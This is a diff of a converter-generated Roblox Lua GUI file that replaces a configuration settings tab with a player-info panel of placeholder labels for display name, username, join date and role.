@@ -7,7 +7,7 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
--- Instances: 739 | Scripts: 27 | Modules: 0 | Tags: 0
+-- Instances: 786 | Scripts: 30 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.T5784YHRGE89ES98T
@@ -499,7 +499,6 @@ G2L["35"]["Name"] = [[greystroke]];
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home
 G2L["36"] = Instance.new("ScrollingFrame", G2L["34"]);
-G2L["36"]["Visible"] = false;
 G2L["36"]["Active"] = true;
 G2L["36"]["BorderSizePixel"] = 0;
 G2L["36"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
@@ -547,394 +546,371 @@ G2L["3a"]["Padding"] = UDim.new(0, 5);
 G2L["3a"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings
-G2L["3b"] = Instance.new("ScrollingFrame", G2L["34"]);
-G2L["3b"]["Visible"] = false;
-G2L["3b"]["Active"] = true;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab
+G2L["3b"] = Instance.new("Frame", G2L["39"]);
 G2L["3b"]["BorderSizePixel"] = 0;
-G2L["3b"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
-G2L["3b"]["Name"] = [[Settings]];
-G2L["3b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["3b"]["Size"] = UDim2.new(0, 360, 0, 255);
-G2L["3b"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["3b"]["Position"] = UDim2.new(0.01351, 0, 0.01887, 0);
+G2L["3b"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
+G2L["3b"]["Size"] = UDim2.new(0, 176, 0, 160);
 G2L["3b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["3b"]["ScrollBarThickness"] = 0;
-G2L["3b"]["BackgroundTransparency"] = 1;
+G2L["3b"]["Name"] = [[playerinfoTab]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside
-G2L["3c"] = Instance.new("Frame", G2L["3b"]);
-G2L["3c"]["BorderSizePixel"] = 0;
-G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["3c"]["Size"] = UDim2.new(0, 176, 0, 255);
-G2L["3c"]["Position"] = UDim2.new(0.51081, 0, 0, 0);
-G2L["3c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["3c"]["Name"] = [[rightside]];
-G2L["3c"]["BackgroundTransparency"] = 1;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfoScript
+G2L["3c"] = Instance.new("LocalScript", G2L["3b"]);
+G2L["3c"]["Name"] = [[playerinfoScript]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.UIListLayout
-G2L["3d"] = Instance.new("UIListLayout", G2L["3c"]);
-G2L["3d"]["Padding"] = UDim.new(0, 5);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.UIListLayout
+G2L["3d"] = Instance.new("UIListLayout", G2L["3b"]);
+G2L["3d"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
 G2L["3d"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab
-G2L["3e"] = Instance.new("Frame", G2L["3c"]);
-G2L["3e"]["BorderSizePixel"] = 0;
-G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
-G2L["3e"]["Size"] = UDim2.new(0, 176, 0, 160);
-G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["3e"]["Name"] = [[configTab]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.greystroke
+G2L["3e"] = Instance.new("UIStroke", G2L["3b"]);
+G2L["3e"]["ZIndex"] = 99;
+G2L["3e"]["Color"] = Color3.fromRGB(51, 51, 51);
+G2L["3e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["3e"]["Name"] = [[greystroke]];
+G2L["3e"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.Script
-G2L["3f"] = Instance.new("LocalScript", G2L["3e"]);
-G2L["3f"]["Name"] = [[Script]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======ACCENT======
+G2L["3f"] = Instance.new("Frame", G2L["3b"]);
+G2L["3f"]["BorderSizePixel"] = 0;
+G2L["3f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["3f"]["Size"] = UDim2.new(1, 0, 0, 4);
+G2L["3f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["3f"]["Name"] = [[======ACCENT======]];
+G2L["3f"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.UIListLayout
-G2L["40"] = Instance.new("UIListLayout", G2L["3e"]);
-G2L["40"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
-G2L["40"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======ACCENT======.GuiColor
+G2L["40"] = Instance.new("Frame", G2L["3f"]);
+G2L["40"]["BorderSizePixel"] = 0;
+G2L["40"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["40"]["Size"] = UDim2.new(1, -2, 0, 2);
+G2L["40"]["Position"] = UDim2.new(0, 1, 0, 1);
+G2L["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["40"]["Name"] = [[GuiColor]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.greystroke
-G2L["41"] = Instance.new("UIStroke", G2L["3e"]);
-G2L["41"]["ZIndex"] = 99;
-G2L["41"]["Color"] = Color3.fromRGB(51, 51, 51);
-G2L["41"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["41"]["Name"] = [[greystroke]];
-G2L["41"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======ACCENT======.GuiColor.UICorner
+G2L["41"] = Instance.new("UICorner", G2L["40"]);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======ACCENT======
-G2L["42"] = Instance.new("Frame", G2L["3e"]);
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======TITLE======
+G2L["42"] = Instance.new("Frame", G2L["3b"]);
 G2L["42"]["BorderSizePixel"] = 0;
 G2L["42"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["42"]["Size"] = UDim2.new(1, 0, 0, 4);
+G2L["42"]["Size"] = UDim2.new(1, 0, 0, 15);
+G2L["42"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
 G2L["42"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["42"]["Name"] = [[======ACCENT======]];
+G2L["42"]["Name"] = [[======TITLE======]];
+G2L["42"]["LayoutOrder"] = 1;
 G2L["42"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======ACCENT======.GuiColor
-G2L["43"] = Instance.new("Frame", G2L["42"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======TITLE======.text
+G2L["43"] = Instance.new("TextLabel", G2L["42"]);
+G2L["43"]["TextWrapped"] = true;
 G2L["43"]["BorderSizePixel"] = 0;
-G2L["43"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
-G2L["43"]["Size"] = UDim2.new(1, -2, 0, 2);
-G2L["43"]["Position"] = UDim2.new(0, 1, 0, 1);
+G2L["43"]["TextSize"] = 14;
+G2L["43"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["43"]["TextTransparency"] = 0.3;
+G2L["43"]["TextScaled"] = true;
+G2L["43"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["43"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["43"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["43"]["BackgroundTransparency"] = 1;
+G2L["43"]["Size"] = UDim2.new(1, 0, -0.13333, 15);
 G2L["43"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["43"]["Name"] = [[GuiColor]];
+G2L["43"]["Text"] = [[Welcome,]];
+G2L["43"]["Name"] = [[text]];
+G2L["43"]["Position"] = UDim2.new(0.02273, 0, 0, 0);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======ACCENT======.GuiColor.UICorner
-G2L["44"] = Instance.new("UICorner", G2L["43"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======TITLE======.text.text
+G2L["44"] = Instance.new("UIStroke", G2L["43"]);
+G2L["44"]["Name"] = [[text]];
 
 
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======TITLE======
-G2L["45"] = Instance.new("Frame", G2L["3e"]);
-G2L["45"]["BorderSizePixel"] = 0;
-G2L["45"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["45"]["Size"] = UDim2.new(1, 0, 0, 15);
-G2L["45"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["45"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["45"]["Name"] = [[======TITLE======]];
-G2L["45"]["LayoutOrder"] = 1;
-G2L["45"]["BackgroundTransparency"] = 1;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======TITLE======.text.UIPadding
+G2L["45"] = Instance.new("UIPadding", G2L["43"]);
+G2L["45"]["PaddingLeft"] = UDim.new(0, 1);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======TITLE======.text
-G2L["46"] = Instance.new("TextLabel", G2L["45"]);
-G2L["46"]["TextWrapped"] = true;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo
+G2L["46"] = Instance.new("Frame", G2L["3b"]);
 G2L["46"]["BorderSizePixel"] = 0;
-G2L["46"]["TextSize"] = 14;
-G2L["46"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["46"]["TextTransparency"] = 0.3;
 G2L["46"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["46"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["46"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["46"]["BackgroundTransparency"] = 1;
-G2L["46"]["Size"] = UDim2.new(1, 0, 0, 15);
+G2L["46"]["Size"] = UDim2.new(1, 0, 0, 70);
+G2L["46"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
 G2L["46"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["46"]["Text"] = [[Configuration]];
-G2L["46"]["Name"] = [[text]];
-G2L["46"]["Position"] = UDim2.new(0.02273, 0, 0, 0);
+G2L["46"]["Name"] = [[playerinfo]];
+G2L["46"]["LayoutOrder"] = 2;
+G2L["46"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======TITLE======.text.text
-G2L["47"] = Instance.new("UIStroke", G2L["46"]);
-G2L["47"]["Name"] = [[text]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.UIPadding
+G2L["47"] = Instance.new("UIPadding", G2L["46"]);
+G2L["47"]["PaddingLeft"] = UDim.new(0, 2);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======TITLE======.text.UIPadding
-G2L["48"] = Instance.new("UIPadding", G2L["46"]);
-G2L["48"]["PaddingLeft"] = UDim.new(0, 1);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.display
+G2L["48"] = Instance.new("TextLabel", G2L["46"]);
+G2L["48"]["TextWrapped"] = true;
+G2L["48"]["ZIndex"] = 10;
+G2L["48"]["BorderSizePixel"] = 0;
+G2L["48"]["TextSize"] = 14;
+G2L["48"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["48"]["TextScaled"] = true;
+G2L["48"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["48"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["48"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["48"]["BackgroundTransparency"] = 1;
+G2L["48"]["Size"] = UDim2.new(0, 100, 0, 13);
+G2L["48"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["48"]["Text"] = [[XXXXX]];
+G2L["48"]["Name"] = [[display]];
+G2L["48"]["Position"] = UDim2.new(0, 0, 0, 2);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======TITLE======.minimise
-G2L["49"] = Instance.new("TextButton", G2L["45"]);
-G2L["49"]["BorderSizePixel"] = 0;
-G2L["49"]["TextTransparency"] = 0.3;
-G2L["49"]["TextSize"] = 14;
-G2L["49"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["49"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["49"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["49"]["BackgroundTransparency"] = 1;
-G2L["49"]["Size"] = UDim2.new(0, 35, 1, 0);
-G2L["49"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["49"]["Text"] = [[-]];
-G2L["49"]["Name"] = [[minimise]];
-G2L["49"]["Position"] = UDim2.new(1, -30, 0, 0);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.display.UIPadding
+G2L["49"] = Instance.new("UIPadding", G2L["48"]);
+G2L["49"]["PaddingLeft"] = UDim.new(0, 6);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox
-G2L["4a"] = Instance.new("Frame", G2L["3e"]);
-G2L["4a"]["BorderSizePixel"] = 0;
-G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["4a"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["4a"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["4a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["4a"]["Name"] = [[configtextbox]];
-G2L["4a"]["LayoutOrder"] = 3;
-G2L["4a"]["BackgroundTransparency"] = 1;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.display.text
+G2L["4a"] = Instance.new("UIStroke", G2L["48"]);
+G2L["4a"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname
-G2L["4b"] = Instance.new("Frame", G2L["4a"]);
-G2L["4b"]["ZIndex"] = 55;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.username
+G2L["4b"] = Instance.new("TextLabel", G2L["46"]);
+G2L["4b"]["TextWrapped"] = true;
+G2L["4b"]["ZIndex"] = 10;
 G2L["4b"]["BorderSizePixel"] = 0;
+G2L["4b"]["TextSize"] = 14;
+G2L["4b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["4b"]["TextScaled"] = true;
 G2L["4b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["4b"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["4b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["4b"]["Name"] = [[configinputname]];
+G2L["4b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["4b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["4b"]["BackgroundTransparency"] = 1;
+G2L["4b"]["Size"] = UDim2.new(0, 100, 0, 13);
+G2L["4b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4b"]["Text"] = [[@xxxxx]];
+G2L["4b"]["Name"] = [[username]];
+G2L["4b"]["Position"] = UDim2.new(0, 0, 0, 17);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.UIPadding
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.username.UIPadding
 G2L["4c"] = Instance.new("UIPadding", G2L["4b"]);
-G2L["4c"]["PaddingTop"] = UDim.new(0, 2);
-G2L["4c"]["PaddingRight"] = UDim.new(0, 3);
-G2L["4c"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["4c"]["PaddingBottom"] = UDim.new(0, 2);
+G2L["4c"]["PaddingLeft"] = UDim.new(0, 6);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.textbox
-G2L["4d"] = Instance.new("TextBox", G2L["4b"]);
-G2L["4d"]["Name"] = [[textbox]];
-G2L["4d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["4d"]["PlaceholderColor3"] = Color3.fromRGB(0, 124, 255);
-G2L["4d"]["TextSize"] = 14;
-G2L["4d"]["TextColor3"] = Color3.fromRGB(0, 124, 255);
-G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["4d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["4d"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["4d"]["PlaceholderText"] = [[---]];
-G2L["4d"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["4d"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["4d"]["Text"] = [[]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.username.text
+G2L["4d"] = Instance.new("UIStroke", G2L["4b"]);
+G2L["4d"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.textbox.outlineStroke
-G2L["4e"] = Instance.new("UIStroke", G2L["4d"]);
-G2L["4e"]["Thickness"] = 2;
-G2L["4e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["4e"]["Name"] = [[outlineStroke]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.joindate
+G2L["4e"] = Instance.new("TextLabel", G2L["46"]);
+G2L["4e"]["TextWrapped"] = true;
+G2L["4e"]["ZIndex"] = 10;
+G2L["4e"]["BorderSizePixel"] = 0;
+G2L["4e"]["TextSize"] = 12;
+G2L["4e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["4e"]["TextScaled"] = true;
+G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["4e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["4e"]["TextColor3"] = Color3.fromRGB(201, 201, 201);
+G2L["4e"]["BackgroundTransparency"] = 1;
+G2L["4e"]["Size"] = UDim2.new(1, 0, 0, 13);
+G2L["4e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4e"]["Text"] = [[🗓️ XXXX-X-X (X days)]];
+G2L["4e"]["Name"] = [[joindate]];
+G2L["4e"]["Position"] = UDim2.new(0, 0, 0, 53);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.textbox.buttonFade
-G2L["4f"] = Instance.new("CanvasGroup", G2L["4d"]);
-G2L["4f"]["BorderSizePixel"] = 0;
-G2L["4f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["4f"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["4f"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["4f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["4f"]["Name"] = [[buttonFade]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.joindate.UIPadding
+G2L["4f"] = Instance.new("UIPadding", G2L["4e"]);
+G2L["4f"]["PaddingLeft"] = UDim.new(0, 6);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.textbox.buttonFade.UIGradient
-G2L["50"] = Instance.new("UIGradient", G2L["4f"]);
-G2L["50"]["Rotation"] = 90;
-G2L["50"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.joindate.text
+G2L["50"] = Instance.new("UIStroke", G2L["4e"]);
+G2L["50"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.textbox.text
-G2L["51"] = Instance.new("UIStroke", G2L["4d"]);
-G2L["51"]["Name"] = [[text]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.profile
+G2L["51"] = Instance.new("ImageLabel", G2L["46"]);
+G2L["51"]["BorderSizePixel"] = 0;
+G2L["51"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["51"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
+G2L["51"]["Size"] = UDim2.new(0, 50, 0, 50);
+G2L["51"]["Visible"] = false;
+G2L["51"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["51"]["BackgroundTransparency"] = 1;
+G2L["51"]["Name"] = [[profile]];
+G2L["51"]["Position"] = UDim2.new(0, 110, 0, 0);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.textbox.UIPadding
-G2L["52"] = Instance.new("UIPadding", G2L["4d"]);
-G2L["52"]["PaddingLeft"] = UDim.new(0, 6);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.profile.UICorner
+G2L["52"] = Instance.new("UICorner", G2L["51"]);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.confignameLABEL
-G2L["53"] = Instance.new("Frame", G2L["3e"]);
-G2L["53"]["BorderSizePixel"] = 0;
-G2L["53"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["53"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["53"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
-G2L["53"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["53"]["Name"] = [[confignameLABEL]];
-G2L["53"]["LayoutOrder"] = 2;
-G2L["53"]["BackgroundTransparency"] = 1;
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.playerinfo
+G2L["53"] = Instance.new("LocalScript", G2L["46"]);
+G2L["53"]["Name"] = [[playerinfo]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.confignameLABEL.text
-G2L["54"] = Instance.new("TextLabel", G2L["53"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.role
+G2L["54"] = Instance.new("TextLabel", G2L["46"]);
 G2L["54"]["TextWrapped"] = true;
 G2L["54"]["ZIndex"] = 10;
 G2L["54"]["BorderSizePixel"] = 0;
-G2L["54"]["TextSize"] = 14;
+G2L["54"]["TextSize"] = 12;
 G2L["54"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["54"]["TextTransparency"] = 0.3;
+G2L["54"]["TextScaled"] = true;
 G2L["54"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["54"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["54"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["54"]["BackgroundTransparency"] = 1;
-G2L["54"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["54"]["Size"] = UDim2.new(0, 100, 0, 13);
 G2L["54"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["54"]["Text"] = [[Config name]];
-G2L["54"]["Name"] = [[text]];
+G2L["54"]["Text"] = [[(USER)]];
+G2L["54"]["Name"] = [[role]];
+G2L["54"]["Position"] = UDim2.new(0, 0, 0, 34);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.confignameLABEL.text.UIPadding
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.role.UIPadding
 G2L["55"] = Instance.new("UIPadding", G2L["54"]);
 G2L["55"]["PaddingLeft"] = UDim.new(0, 6);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.confignameLABEL.text.text
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.role.text
 G2L["56"] = Instance.new("UIStroke", G2L["54"]);
 G2L["56"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig
-G2L["57"] = Instance.new("Frame", G2L["3e"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---
+G2L["57"] = Instance.new("Frame", G2L["3b"]);
 G2L["57"]["BorderSizePixel"] = 0;
 G2L["57"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["57"]["Size"] = UDim2.new(1, 0, 0, 23);
+G2L["57"]["Size"] = UDim2.new(1, 0, 0, 10);
 G2L["57"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
 G2L["57"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["57"]["Name"] = [[createconfig]];
-G2L["57"]["LayoutOrder"] = 4;
+G2L["57"]["Name"] = [[---DIVIDER---]];
+G2L["57"]["LayoutOrder"] = 3;
 G2L["57"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button
-G2L["58"] = Instance.new("TextButton", G2L["57"]);
-G2L["58"]["BorderSizePixel"] = 0;
-G2L["58"]["TextTransparency"] = 1;
-G2L["58"]["TextSize"] = 14;
-G2L["58"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["58"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["58"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["58"]["ZIndex"] = 49;
-G2L["58"]["BackgroundTransparency"] = 1;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.dividerFrame
+G2L["58"] = Instance.new("Frame", G2L["57"]);
+G2L["58"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["58"]["BorderMode"] = Enum.BorderMode.Inset;
 G2L["58"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["58"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["58"]["Name"] = [[button]];
+G2L["58"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
